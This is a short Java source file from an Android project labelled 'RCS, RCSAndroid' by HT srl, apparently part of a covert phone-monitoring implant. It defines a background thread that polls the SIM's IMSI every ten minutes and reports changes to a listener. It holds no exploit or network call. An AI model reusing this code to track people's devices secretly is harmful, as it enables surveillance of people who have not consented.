/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSAndroid
 * File         : BroadcastMonitorSim.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.ht.RCSAndroidGUI.listener;

import com.ht.RCSAndroidGUI.Device;
import com.ht.RCSAndroidGUI.Sim;

public class BroadcastMonitorSim extends Thread {
		/** The Constant TAG. */
		private static final String TAG = "BroadcastMonitorSim";

		private boolean stop;
		private int period;

		public BroadcastMonitorSim() {
			stop = false;
			period = 10 * 60 * 1000; // Poll interval, 10 minutes
		}

		synchronized public void run() {
			do {
				if (stop) {
					return;
				}
				
				String imsi = Device.self().getImsi();
				onReceive(imsi);
				
				try {
					wait(period);
				} catch (InterruptedException e) {
					e.printStackTrace();
				}
			} while (true);
		}

		public void onReceive(String imsi) {
			ListenerSim.self().dispatch(new Sim(imsi));
		}

		void register() {
			stop = false;
		}

		synchronized void unregister() {
			stop = true;
			notify();
		}
	}
